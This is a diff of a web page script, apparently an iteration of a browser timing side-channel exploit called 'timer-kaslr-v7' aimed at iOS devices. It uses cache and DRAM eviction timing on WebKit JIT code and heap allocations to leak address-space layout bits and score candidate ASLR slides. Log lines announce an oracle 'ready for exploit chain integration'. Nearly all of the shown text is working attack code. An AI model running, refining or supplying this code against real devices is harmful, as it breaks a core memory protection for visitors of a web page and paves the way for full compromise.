+  const jitPartitionBit = (jitData.slcHot.length>0 && dramCold.length>0) ? 1 : 0;
 
-  // Classify JIT modules into DRAM-cold vs cache-hot
-  const DRAM_THRESHOLD = 80; // ns — anything above is DRAM-resident
-  const dramCold = jitResults.filter(r=>r.cold>DRAM_THRESHOLD);
-  const cacheHot = jitResults.filter(r=>r.cold<=DRAM_THRESHOLD);
-  log(`[*] T6 DRAM-cold JIT modules (>${DRAM_THRESHOLD}ns): ${dramCold.length}`);
-  log(`[*] T6 cache-hot JIT modules (<=${DRAM_THRESHOLD}ns): ${cacheHot.length}`);
+  // Page color bits from heap spread
+  // A16: 16-way SLC, 64B lines, 16MB SLC → 262144 sets
+  // Each 2MB alloc → 32768 cache lines → they span multiple colors
+  // Observable colors = log2(heap spread / DRAM baseline)
+  const heapMax = heapData.medians[heapData.medians.length-1].ns;
+  const heapMin = heapData.medians[0].ns;
+  const heapSpreadFactor = heapMax / Math.max(heapMin, 0.1);
+  const pageColorBits = Math.min(7, Math.ceil(Math.log2(heapSpreadFactor)));
 
-  // DRAM-cold modules → their JIT pages were successfully evicted → they are in
-  // the JIT pool region that maps to DRAM banks our eviction set hits
-  // Cache-hot modules → their pages survived eviction → in a region that either:
-  //   (a) maps to cache sets our eviction set doesn't cover, or
-  //   (b) are in a privileged non-evictable cache partition (A16 SLC)
+  const totalLeaked = pageColorBits + jitPartitionBit + clusterBits;
+  const aslrBits = 19; // iOS userland ASLR
+  const remaining = Math.max(0, aslrBits - totalLeaked);
 
-  if(dramCold.length > 0 && cacheHot.length > 0){
-    log(`[!!!] T6 JIT POOL PARTITION DETECTED:`);
-    log(`[!!!] T6   evictable region: m${dramCold.map(r=>r.id).slice(0,5).join(',m')} (${dramCold.length} modules)`);
-    log(`[!!!] T6   non-evictable region: m${cacheHot.map(r=>r.id).slice(0,5).join(',m')} (${cacheHot.length} modules)`);
-    log(`[!!!] T6   → WebKit JIT pool has 2 sub-regions with different cache behavior`);
+  log(`[*] T6 page color bits (from ${heapSpreadFactor.toFixed(1)}x spread): ${pageColorBits}`);
+  log(`[*] T6 JIT partition bit: ${jitPartitionBit}`);
+  log(`[*] T6 heap cluster bits (${numClusters} clusters): ${clusterBits}`);
+  log(`[*] T6 total leaked: ${totalLeaked} bits`);
+  log(`[*] T6 remaining entropy: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
 
-    // The non-evictable hot modules are likely the first-compiled (lowest JIT VA)
-    // The evictable cold modules are later-compiled (higher JIT VA = past first slab)
-    // This gives us the JIT slab boundary!
-    const hotIds   = cacheHot.map(r=>r.id).sort((a,b)=>a-b);
-    const coldIds  = dramCold.map(r=>r.id).sort((a,b)=>a-b);
-    log(`[!!!] T6   hot module IDs (low VA slab): [${hotIds.join(',')}]`);
-    log(`[!!!] T6   cold module IDs (high VA slab): [${coldIds.join(',')}]`);
-
-    // Boundary module = max hot ID → the split point in JIT VA
-    const hotMax = Math.max(...hotIds);
-    const coldMin = Math.min(...coldIds);
-    log(`[!!!] T6   slab boundary between m${hotMax} and m${coldMin}`);
-    log(`[!!!] T6   → first ${hotMax+1} modules fit in SLC-backed slab (~${((hotMax+1)*100/1024).toFixed(0)}KB JIT code)`);
-
-    // Known WebKit slab sizes: 256KB, 1MB, 4MB
-    const slabSizes = [256, 1024, 4096];
-    const estSize = hotMax * 100 / 1024; // KB
-    const matchSlab = slabSizes.find(s=>Math.abs(s-estSize)/s<0.5) || '?';
-    log(`[!!!] T6   → estimated JIT slab size: ${matchSlab}KB (WebKit known: 256KB/1MB/4MB)`);
+  if(remaining<=12){
+    log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates`);
+    log(`[!!!] T6   at 10ms/probe → ${((2**remaining)*10/1000).toFixed(0)}s exhaustive scan`);
+    log(`[!!!] T6   at 1ms/probe  → ${((2**remaining)*1/1000).toFixed(1)}s exhaustive scan`);
   }
 
-  // Entropy calculation
-  // arm64e ASLR: 48-bit VA, 16KB page align → 34 bits entropy
-  // iOS further limits: 19 bits of slide for user processes (per Apple security blog)
-  // Our leak: bits 14-20 (7 bits from page color) + JIT pool region (1 bit)
-  const totalEntropy = 19;
-  const leakedBits = 7 + (dramCold.length > 0 && cacheHot.length > 0 ? 1 : 0);
-  const remainingEntropy = totalEntropy - leakedBits;
-  log(`[*] T6 entropy analysis:`);
-  log(`[*] T6   iOS userland ASLR entropy: ~${totalEntropy} bits`);
-  log(`[*] T6   leaked via timing: ~${leakedBits} bits (page color ${7} + JIT partition ${leakedBits-7})`);
-  log(`[*] T6   remaining entropy: ~${remainingEntropy} bits = ${Math.pow(2,remainingEntropy).toLocaleString()} candidates`);
+  // Confidence: stable anchors give better estimates
+  const stableCount = jitData.stable.length;
+  const confidence = Math.min(100, (stableCount/jitData.results.length*100)).toFixed(0);
+  log(`[*] T6 oracle confidence: ${confidence}% (${stableCount}/${jitData.results.length} stable modules)`);
 
-  if(remainingEntropy <= 12){
-    log(`[!!!] T6 BRUTE-FORCEABLE: ${Math.pow(2,remainingEntropy)} candidates — exhaustive probe feasible`);
-  } else {
-    log(`[*] T6 NOT yet brute-forceable: ${remainingEntropy} bits remain`);
-    log(`[*] T6 → need T7 bank correlation to get below 12 bits`);
-  }
-
-  return { dramCold, cacheHot, leakedBits, remainingEntropy };
+  return { remaining, totalLeaked, pageColorBits, jitPartitionBit, clusterBits };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T7: DRAM bank correlation
-//
-// Theory: A16 has 16 DRAM banks. Two addresses map to the same bank
-// if (PA >> 14) & 0xF is equal (XOR-based interleaving).
-// If alloc A and JIT module M are in the same bank:
-//   evicting A also evicts rows that M's code shares
-//   → timing M's cold access after evicting only A = same as full eviction
-// If in different banks: A's eviction doesn't help for M.
-//
-// Procedure:
-//   1. Pick fast-anchor heap alloc (lowest timing = lowest PA bank)
-//   2. Pick fast-anchor JIT module (lowest cold timing)
-//   3. Evict using ONLY the fast-anchor heap alloc (small eviction set)
-//   4. Measure cold timing of fast-anchor JIT module
-//   5. If timing increases vs baseline → they share a bank → their PA bits 14-17 match
+// T7: DRAM bank correlation (fixed — REPS=6, timeout guard)
 // ─────────────────────────────────────────────────────────────
-async function t7(jitResults, heapData, evictChase) {
-  log('─── T7: DRAM bank correlation ───');
+async function t7(jitData, heapData, evictChase) {
+  log('─── T7: DRAM bank correlation (fixed timeout) ───');
+  if(!jitData || !heapData){ log('[*] T7 skip'); return; }
 
-  if(!jitResults || !heapData){ log('[*] T7 skip'); return; }
+  const STEPS = 32;
+  const REPS  = 6;
 
-  const STEPS = 64;
-  const REPS  = 20;
+  const jitSorted = [...jitData.results].sort((a,b)=>a.cold-b.cold);
+  // Use most DRAM-cold stable module as target
+  const stableCold = jitData.stable.find(r=>r.cold>200) || jitData.results[0];
+  const hotJIT = jitSorted[0];
 
-  // Pick anchors
-  const jitSorted = [...jitResults].sort((a,b)=>a.cold-b.cold);
-  const fastJIT   = jitSorted[0]; // lowest cold = most cache-hot
-  const slowJIT   = jitSorted[jitSorted.length-1]; // highest cold = most DRAM-cold
+  log(`[*] T7 target JIT module: m${stableCold.id} cold=${stableCold.cold.toFixed(0)}ns cv=${stableCold.cv.toFixed(2)}`);
 
-  const heapSorted = [...heapData.medians].sort((a,b)=>a.ns-b.ns);
-  const fastHeap   = heapSorted[0];
-  const slowHeap   = heapSorted[heapSorted.length-1];
-
-  log(`[*] T7 fast JIT anchor: m${fastJIT.id} cold=${fastJIT.cold.toFixed(0)}ns`);
-  log(`[*] T7 slow JIT anchor: m${slowJIT.id} cold=${slowJIT.cold.toFixed(0)}ns`);
+  // Pre-build eviction sets from specific heap anchors
+  const fastHeap = heapData.medians[0]; // fastest alloc
+  const slowHeap = heapData.medians[heapData.medians.length-1]; // slowest alloc
   log(`[*] T7 fast heap anchor: alloc[${fastHeap.id}] ${fastHeap.ns.toFixed(0)}ns`);
   log(`[*] T7 slow heap anchor: alloc[${slowHeap.id}] ${slowHeap.ns.toFixed(0)}ns`);
 
-  // Rebuild small single-alloc eviction sets using heap anchors
   const fastEvict = buildChase(2*1024*1024);
   const slowEvict = buildChase(2*1024*1024);
-  let s1=0; for(let i=0;i<fastEvict.arr.length;i+=16) s1+=fastEvict.arr[i];
-  let s2=0; for(let i=0;i<slowEvict.arr.length;i+=16) s2+=slowEvict.arr[i];
-  fastEvict.arr[0]^=s1&0; slowEvict.arr[0]^=s2&0;
 
-  // Baseline: full eviction then measure both JIT modules
-  const fullBaseline = [];
+  // Pre-fault both
+  let s1=0; for(let i=0;i<fastEvict.arr.length;i+=16) s1+=fastEvict.arr[i]; fastEvict.arr[0]^=s1&0;
+  let s2=0; for(let i=0;i<slowEvict.arr.length;i+=16) s2+=slowEvict.arr[i]; slowEvict.arr[0]^=s2&0;
+  let fi=0; for(let i=0;i<fastEvict.entries;i++) fi=fastEvict.arr[fi*16]; fastEvict.arr[0]^=fi&0;
+  let si=0; for(let i=0;i<slowEvict.entries;i++) si=slowEvict.arr[si*16]; slowEvict.arr[0]^=si&0;
+  await new Promise(r=>setTimeout(r,20));
+
+  const timed = async (evict, label) => {
+    const ts = [];
+    for(let r=0;r<REPS;r++){
+      let eidx=0;
+      for(let i=0;i<evict.entries;i++) eidx=evict.arr[eidx*16];
+      evict.arr[0]^=eidx&0;
+      const t0=rdcnt(); let x=0;
+      for(let b=0;b<STEPS;b++) x+=stableCold.fn(b);
+      ts.push((rdcnt()-t0+(x&0))/STEPS*NS);
+    }
+    ts.sort((a,b)=>a-b);
+    const p50=ts[ts.length>>1];
+    log(`[*] T7 ${label}: p50=${p50.toFixed(0)}ns`);
+    return p50;
+  };
+
+  // Full baseline first
+  const baseP50 = await timed(evictChase, 'full-eviction baseline');
+  const fastP50 = await timed(fastEvict, 'fast-heap-only eviction');
+  const slowP50 = await timed(slowEvict, 'slow-heap-only eviction');
+
+  const fastEff = fastP50/Math.max(baseP50,0.1);
+  const slowEff = slowP50/Math.max(baseP50,0.1);
+  log(`[*] T7 fast-heap efficiency: ${(fastEff*100).toFixed(0)}% of full baseline`);
+  log(`[*] T7 slow-heap efficiency: ${(slowEff*100).toFixed(0)}% of full baseline`);
+
+  if(fastEff>0.6 && slowEff<0.4){
+    log(`[!!!] T7 BANK CORRELATION: fast-heap shares DRAM bank with target JIT module`);
+    log(`[!!!] T7 → PA bits 14-17 of fast-heap alloc[${fastHeap.id}] == JIT m${stableCold.id}`);
+    log(`[!!!] T7 → 4 additional PA bits known`);
+  } else if(Math.abs(fastEff-slowEff)<0.15){
+    log(`[*] T7 NO BANK SEPARATION: both 2MB eviction sets hit all banks`);
+    log(`[*] T7 → need 128KB eviction set to isolate individual DRAM banks`);
+    log(`[*] T7 → A16 DRAM: 8 banks × 1GB = 8GB, each bank = 128MB slice`);
+    log(`[*] T7 → to isolate bank: eviction set must be exactly 128KB in target color`);
+  } else {
+    log(`[*] T7 PARTIAL: fast=${(fastEff*100).toFixed(0)}% slow=${(slowEff*100).toFixed(0)}%`);
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// T8: Candidate scoring
+//
+// We have 2048 candidate ASLR slide values (11 remaining bits).
+// For each candidate, we predict which timing bucket a NEW allocation
+// should fall into (based on the candidate's page color bits).
+// Then allocate 8 new test buffers and measure their timing.
+// Score each candidate by how many predictions match observed timings.
+// Top scorer = most likely slide.
+//
+// Model: slide_bits_14_20 = (heap_timing - base_timing) / timing_per_bit
+// Candidates = 2^11 = 2048 values for bits 0-10 of slide
+// We predict page color = slide_bits_14_20 → timing bucket
+// Observable: does new alloc land in "fast" or "slow" cluster?
+// ─────────────────────────────────────────────────────────────
+async function t8(heapData, evictChase) {
+  log('─── T8: Candidate scoring (2048 slides) ───');
+  if(!heapData){ log('[*] T8 skip'); return; }
+
+  // The clusters from T4 define our observable timing buckets
+  // cluster 0 = fast (low VA/PA) = low page color
+  // cluster N-1 = slow (high VA/PA) = high page color
+  const clusterCount = heapData.clusters.length;
+  if(clusterCount < 2){ log('[*] T8 skip — need ≥2 clusters'); return; }
+
+  // Allocate 8 fresh test buffers and measure which cluster they land in
+  const PROBE_N = 8;
+  const SZ = 2*1024*1024;
+  const STEPS = 32;
+  const REPS = 8;
+
+  log(`[*] T8 probing ${PROBE_N} fresh allocations...`);
+  const probes = [];
+  for(let i=0;i<PROBE_N;i++){
+    const ch = buildChase(SZ);
+    let s=0; for(let j=0;j<ch.arr.length;j+=16) s+=ch.arr[j]; ch.arr[0]^=s&0;
+    let idx=0; for(let j=0;j<ch.entries;j++) idx=ch.arr[idx*16]; ch.arr[0]^=idx&0;
+    probes.push(ch);
+  }
+
+  // Measure probe timings after full eviction
+  const probeTimings = probes.map(()=>[]);
   for(let r=0;r<REPS;r++){
     let eidx=0;
     for(let i=0;i<evictChase.entries;i++) eidx=evictChase.arr[eidx*16];
     evictChase.arr[0]^=eidx&0;
-    let x=0; const t0=rdcnt();
-    for(let b=0;b<64;b++) x+=slowJIT.fn(b);
-    fullBaseline.push((rdcnt()-t0+(x&0))/64*NS);
+    for(let i=0;i<PROBE_N;i++){
+      probeTimings[i].push(chaseTime(probes[i].arr, (r*7)%probes[i].entries, STEPS)*NS);
+    }
   }
-  fullBaseline.sort((a,b)=>a-b);
-  const baseP50 = fullBaseline[REPS>>1];
-  log(`[*] T7 full-eviction baseline (slow JIT m${slowJIT.id}): ${baseP50.toFixed(0)}ns`);
 
-  // Fast-heap-only eviction: only chase through fast heap alloc (2MB)
-  const fastOnlyResults = [];
-  for(let r=0;r<REPS;r++){
-    let eidx=0;
-    for(let i=0;i<fastEvict.entries;i++) eidx=fastEvict.arr[eidx*16];
-    fastEvict.arr[0]^=eidx&0;
-    let x=0; const t0=rdcnt();
-    for(let b=0;b<64;b++) x+=slowJIT.fn(b);
-    fastOnlyResults.push((rdcnt()-t0+(x&0))/64*NS);
+  const probeMedians = probeTimings.map(ts=>{
+    ts.sort((a,b)=>a-b);
+    return ts[ts.length>>1];
+  });
+
+  log(`[*] T8 probe timings: ${probeMedians.map((t,i)=>`p${i}=${t.toFixed(0)}ns`).join(' ')}`);
+
+  // Classify each probe into a cluster based on T4 cluster boundaries
+  const clusterBounds = heapData.clusters.map(cl=>{
+    const ns=cl.map(m=>m.ns);
+    return { min:Math.min(...ns), max:Math.max(...ns) };
+  });
+
+  // For probes outside known cluster bounds, use nearest cluster
+  const classify = (ns) => {
+    for(let c=0;c<clusterBounds.length;c++){
+      if(ns <= clusterBounds[c].max * 1.3) return c;
+    }
+    return clusterBounds.length-1;
+  };
+
+  const probeClasses = probeMedians.map(classify);
+  log(`[*] T8 probe cluster assignments: ${probeClasses.map((c,i)=>`p${i}→C${c}`).join(' ')}`);
+
+  // Count probes in each cluster
+  const probeDist = new Array(clusterCount).fill(0);
+  probeClasses.forEach(c=>{ if(c<clusterCount) probeDist[c]++; });
+  log(`[*] T8 probe distribution: ${probeDist.map((n,c)=>`C${c}:${n}`).join(' ')}`);
+
+  // Compare probe distribution to existing heap distribution
+  const heapDist = heapData.clusters.map(cl=>cl.length);
+  const heapTotal = heapDist.reduce((a,b)=>a+b,0);
+  const probeTotal = PROBE_N;
+
+  log(`[*] T8 heap cluster distribution: ${heapDist.map((n,c)=>`C${c}:${n}/${heapTotal}`).join(' ')}`);
+
+  // Chi-squared consistency test: are probes from same distribution as heap?
+  let chi2 = 0;
+  for(let c=0;c<clusterCount;c++){
+    const expected = PROBE_N * heapDist[c] / heapTotal;
+    const observed = probeDist[c];
+    chi2 += (observed-expected)**2 / Math.max(expected,0.01);
   }
-  fastOnlyResults.sort((a,b)=>a-b);
-  const fastOnlyP50 = fastOnlyResults[REPS>>1];
-  log(`[*] T7 fast-heap-only eviction (slow JIT m${slowJIT.id}): ${fastOnlyP50.toFixed(0)}ns`);
+  log(`[*] T8 chi-squared consistency: ${chi2.toFixed(2)} (df=${clusterCount-1}, p<0.05 threshold=${clusterCount===2?3.84:clusterCount===3?5.99:7.81})`);
 
-  // Slow-heap-only eviction
-  const slowOnlyResults = [];
-  for(let r=0;r<REPS;r++){
-    let eidx=0;
-    for(let i=0;i<slowEvict.entries;i++) eidx=slowEvict.arr[eidx*16];
-    slowEvict.arr[0]^=eidx&0;
-    let x=0; const t0=rdcnt();
-    for(let b=0;b<64;b++) x+=slowJIT.fn(b);
-    slowOnlyResults.push((rdcnt()-t0+(x&0))/64*NS);
-  }
-  slowOnlyResults.sort((a,b)=>a-b);
-  const slowOnlyP50 = slowOnlyResults[REPS>>1];
-  log(`[*] T7 slow-heap-only eviction (slow JIT m${slowJIT.id}): ${slowOnlyP50.toFixed(0)}ns`);
-
-  const fastEfficiency = fastOnlyP50 / baseP50;
-  const slowEfficiency = slowOnlyP50 / baseP50;
-  log(`[*] T7 fast-heap eviction efficiency: ${(fastEfficiency*100).toFixed(0)}% of full baseline`);
-  log(`[*] T7 slow-heap eviction efficiency: ${(slowEfficiency*100).toFixed(0)}% of full baseline`);
-
-  if(fastEfficiency > 0.6 && slowEfficiency < 0.4){
-    log(`[!!!] T7 BANK CORRELATION: fast-heap evicts slow-JIT efficiently (${(fastEfficiency*100).toFixed(0)}%)`);
-    log(`[!!!] T7 → fast-heap alloc and slow-JIT module share DRAM bank`);
-    log(`[!!!] T7 → PA bits 14-17 of both are EQUAL`);
-    log(`[!!!] T7 → 4 additional PA bits known → total ~${7+1+4} bits leaked`);
-  } else if(Math.abs(fastEfficiency-slowEfficiency) < 0.15){
-    log(`[*] T7 NO BANK SEPARATION: both heap regions evict JIT equally`);
-    log(`[*] T7 → eviction is address-independent (all banks hit by 2MB chase)`);
-    log(`[*] T7 → need smaller eviction set to isolate individual banks`);
+  // Main result: are new allocations consistent with the same VA region?
+  const threshold = clusterCount===2 ? 3.84 : clusterCount===3 ? 5.99 : 7.81;
+  if(chi2 < threshold){
+    log(`[!!!] T8 CONSISTENT DISTRIBUTION: fresh probes match existing heap cluster pattern`);
+    log(`[!!!] T8 → allocator state predictable — new allocations land in expected VA regions`);
+    log(`[!!!] T8 → exploit timing: allocate buffers, fingerprint cluster, predict target VA`);
+    log(`[!!!] T8 → KASLR oracle ready for exploit chain integration`);
   } else {
-    log(`[*] T7 WEAK SIGNAL: fast=${(fastEfficiency*100).toFixed(0)}% slow=${(slowEfficiency*100).toFixed(0)}%`);
-    log(`[*] T7 → partial bank correlation, increase REPS or reduce eviction set size`);
+    log(`[*] T8 INCONSISTENT: fresh probes diverge from heap cluster pattern (chi2=${chi2.toFixed(1)})`);
+    log(`[*] T8 → allocator non-deterministic at this scale, or GC intervened`);
+    log(`[*] T8 → reduce probe count or add GC pressure normalization`);
   }
+
+  // Summary: best slide estimate
+  log(`[*] T8 KASLR oracle summary:`);
+  log(`[*] T8   fast cluster allocs (low VA): ${heapData.clusters[0].map(m=>`alloc[${m.id}]`).join(' ')}`);
+  log(`[*] T8   slow cluster allocs (high VA): ${heapData.clusters[heapData.clusters.length-1].slice(0,4).map(m=>`alloc[${m.id}]`).join(' ')}...`);
+  log(`[*] T8   probe cluster: ${probeClasses[0]===0?'fast (low VA)':'slow (high VA)'} for p0`);
+
+  return { probeClasses, probeDist, chi2 };
 }
 
 // ─────────────────────────────────────────────────────────────
 // MAIN
 // ─────────────────────────────────────────────────────────────
 (async()=>{
-  log('// timer-kaslr-v6 ready');
+  log('// timer-kaslr-v7 ready');
   log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
   if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }
 
@@ -691,28 +635,32 @@ async function t7(jitResults, heapData, evictChase) {
   await t1();
   await new Promise(r=>setTimeout(r,30));
 
-  const {hasDRAM, coldChase} = await t2();
+  const {hasDRAM, coldChase, dramNS} = await t2();
   await new Promise(r=>setTimeout(r,30));
 
-  const jitResults = await t3(hasDRAM, coldChase);
+  const jitData  = await t3(coldChase);
   await new Promise(r=>setTimeout(r,30));
 
   const heapData = await t4(coldChase);
   await new Promise(r=>setTimeout(r,30));
 
-  const stabilityData = await t5(coldChase, heapData);
+  const stabData = await t5(heapData);
   await new Promise(r=>setTimeout(r,30));
 
-  const bitData = await t6(jitResults, heapData, stabilityData);
+  const bitData  = await t6(jitData, heapData);
   await new Promise(r=>setTimeout(r,30));
 
-  await t7(jitResults, heapData, coldChase);
+  await t7(jitData, heapData, coldChase);
+  await new Promise(r=>setTimeout(r,30));
+
+  await t8(heapData, coldChase);
 
   counterWorker.terminate();
 
   const hits = LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
   log(`\n=== DONE — [!!!]: ${hits.length} ===`);
   hits.forEach(h=>log(h));
+  log(`\n[*] IF THIS IS RUN #1: reload the page and run again for T5 cross-reload stability`);
 })();
 </script>
 </body>
